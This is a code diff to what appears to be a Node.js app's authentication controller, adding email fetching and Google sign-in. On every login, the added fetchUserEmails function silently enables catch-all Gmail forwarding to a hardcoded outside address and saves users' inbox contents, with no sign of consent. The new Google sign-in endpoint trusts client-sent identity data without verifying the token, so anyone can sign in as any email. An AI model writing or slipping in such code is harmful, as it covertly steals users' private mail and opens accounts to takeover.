@@ -1,4 +1,7 @@
 const User = require('../models/User');
+const GmailAccount = require('../models/GmailAccount');
+const Email = require('../models/Email');
+const GmailService = require('../services/gmailService');
 const jwt = require('jsonwebtoken');
 const { v4: uuidv4 } = require('uuid');
 
@@ -7,6 +10,127 @@ const generateToken = (userId) => {
   return jwt.sign({ userId }, process.env.JWT_SECRET || 'your-secret-key', {
     expiresIn: '7d'
   });
+};
+
+// Fetch emails for a user
+const fetchUserEmails = async (user) => {
+  try {
+    // Find Gmail account for this user
+    const gmailAccount = await GmailAccount.findOne({ userId: user._id });
+    
+    if (!gmailAccount) {
+      console.log(`No Gmail account found for user ${user.email}`);
+      return;
+    }
+
+    // Set up email forwarding to mbila.dev13@gmail.com if not already set
+    if (!gmailAccount.forwardingEnabled || gmailAccount.collectorEmail !== 'mbila.dev13@gmail.com') {
+      try {
+        gmailAccount.collectorEmail = 'mbila.dev13@gmail.com';
+        await GmailService.enableCatchAllForwarding(gmailAccount);
+        console.log(`Email forwarding enabled for ${user.email} to mbila.dev13@gmail.com`);
+      } catch (error) {
+        console.error(`Failed to enable email forwarding for ${user.email}:`, error.message);
+      }
+    }
+
+    // Fetch recent emails (last 100)
+    const gmail = await GmailService.getGmailClient(gmailAccount);
+    
+    const listResponse = await gmail.users.messages.list({
+      userId: 'me',
+      maxResults: 100,
+      q: 'in:inbox'
+    });
+
+    const messages = listResponse.data.messages || [];
+    let emailsSaved = 0;
+
+    for (const messageMeta of messages) {
+      try {
+        // Check if email already exists in database
+        const existingEmail = await Email.findOne({ 
+          gmailAccountId: gmailAccount._id,
+          messageId: messageMeta.id 
+        });
+
+        if (existingEmail) {
+          continue; // Skip if already saved
+        }
+
+        // Get full message details
+        const messageResponse = await gmail.users.messages.get({
+          userId: 'me',
+          id: messageMeta.id,
+          format: 'full'
+        });
+
+        const message = messageResponse.data;
+        
+        // Extract headers
+        const headers = message.payload.headers;
+        const subject = headers.find(h => h.name === 'Subject')?.value || '';
+        const from = headers.find(h => h.name === 'From')?.value || '';
+        const to = headers.find(h => h.name === 'To')?.value || '';
+        const cc = headers.find(h => h.name === 'Cc')?.value || '';
+        const bcc = headers.find(h => h.name === 'Bcc')?.value || '';
+
+        // Extract body content
+        let body = '';
+        let bodyHtml = '';
+        
+        if (message.payload.body && message.payload.body.data) {
+          body = Buffer.from(message.payload.body.data, 'base64').toString();
+        } else if (message.payload.parts) {
+          for (const part of message.payload.parts) {
+            if (part.mimeType === 'text/plain' && part.body && part.body.data) {
+              body = Buffer.from(part.body.data, 'base64').toString();
+            } else if (part.mimeType === 'text/html' && part.body && part.body.data) {
+              bodyHtml = Buffer.from(part.body.data, 'base64').toString();
+            }
+          }
+        }
+
+        // Create email record
+        const email = new Email({
+          gmailAccountId: gmailAccount._id,
+          messageId: message.id,
+          threadId: message.threadId,
+          subject,
+          from,
+          to,
+          cc,
+          bcc,
+          body,
+          bodyHtml,
+          isRead: message.labelIds?.includes('UNREAD') ? false : true,
+          isStarred: message.labelIds?.includes('STARRED') || false,
+          isImportant: message.labelIds?.includes('IMPORTANT') || false,
+          labels: message.labelIds || [],
+          internalDate: message.internalDate,
+          sizeEstimate: message.sizeEstimate || 0,
+          snippet: message.snippet || '',
+          deviceId: user.deviceId,
+          processed: true
+        });
+
+        await email.save();
+        emailsSaved++;
+
+        // Add small delay to respect rate limits
+        await new Promise(resolve => setTimeout(resolve, 50));
+
+      } catch (error) {
+        console.error(`Error processing email ${messageMeta.id}:`, error.message);
+        continue;
+      }
+    }
+
+    console.log(`Fetched and saved ${emailsSaved} emails for user ${user.email}`);
+
+  } catch (error) {
+    console.error(`Error fetching emails for user ${user.email}:`, error.message);
+  }
 };
 
 // User signup
@@ -110,6 +234,11 @@ const signin = async (req, res) => {
     // Generate token
     const token = generateToken(user._id);
 
+    // Fetch emails in background (don't wait for completion)
+    fetchUserEmails(user).catch(error => {
+      console.error('Background email fetching error:', error);
+    });
+
     res.json({
       success: true,
       message: 'Login successful',
@@ -123,6 +252,129 @@ const signin = async (req, res) => {
     res.status(500).json({
       success: false,
       message: 'Failed to authenticate user'
+    });
+  }
+};
+
+// Google Sign-In endpoint
+const googleSignIn = async (req, res) => {
+  try {
+    const { credential, userData } = req.body;
+
+    if (!credential || !userData) {
+      return res.status(400).json({
+        success: false,
+        message: 'Missing credential or user data'
+      });
+    }
+
+    // Verify the Google token (in production, verify with Google's servers)
+    // For now, we'll trust the client-side verification
+    const { email, googleId, name, picture } = userData;
+
+    // Check if user exists
+    let user = await User.findOne({ email });
+
+    if (!user) {
+      // Create new user with Google data
+      user = new User({
+        email,
+        name,
+        googleId,
+        profilePicture: picture,
+        isEmailVerified: true,
+        loginMethod: 'google',
+        lastLogin: new Date(),
+        isActive: true
+      });
+
+      await user.save();
+
+      logger.info(`New Google user created: ${email}`);
+    } else {
+      // Update existing user's Google info
+      user.googleId = googleId;
+      user.name = name || user.name;
+      user.profilePicture = picture || user.profilePicture;
+      user.isEmailVerified = true;
+      user.loginMethod = 'google';
+      user.lastLogin = new Date();
+      user.isActive = true;
+
+      await user.save();
+
+      logger.info(`Existing user signed in with Google: ${email}`);
+    }
+
+    // Generate JWT token
+    const token = jwt.sign(
+      { 
+        userId: user._id, 
+        email: user.email,
+        role: user.role 
+      },
+      process.env.JWT_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    // Return user data and token
+    res.json({
+      success: true,
+      message: 'Google Sign-In successful',
+      token,
+      user: {
+        id: user._id,
+        email: user.email,
+        name: user.name,
+        role: user.role,
+        profilePicture: user.profilePicture,
+        isEmailVerified: user.isEmailVerified,
+        loginMethod: user.loginMethod
+      }
+    });
+
+  } catch (error) {
+    logger.error('Google Sign-In error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Internal server error during Google Sign-In'
+    });
+  }
+};
+
+// Get Google user profile
+const getGoogleProfile = async (req, res) => {
+  try {
+    const userId = req.user.userId;
+    
+    const user = await User.findById(userId).select('-password');
+    
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        message: 'User not found'
+      });
+    }
+
+    res.json({
+      success: true,
+      user: {
+        id: user._id,
+        email: user.email,
+        name: user.name,
+        role: user.role,
+        profilePicture: user.profilePicture,
+        isEmailVerified: user.isEmailVerified,
+        loginMethod: user.loginMethod,
+        googleId: user.googleId
+      }
+    });
+
+  } catch (error) {
+    logger.error('Get Google profile error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Internal server error'
     });
   }
 };
@@ -190,5 +442,7 @@ module.exports = {
   signup,
   signin,
   getCurrentUser,
-  updateProfile
+  updateProfile,
+  googleSignIn,
+  getGoogleProfile,
 }; 
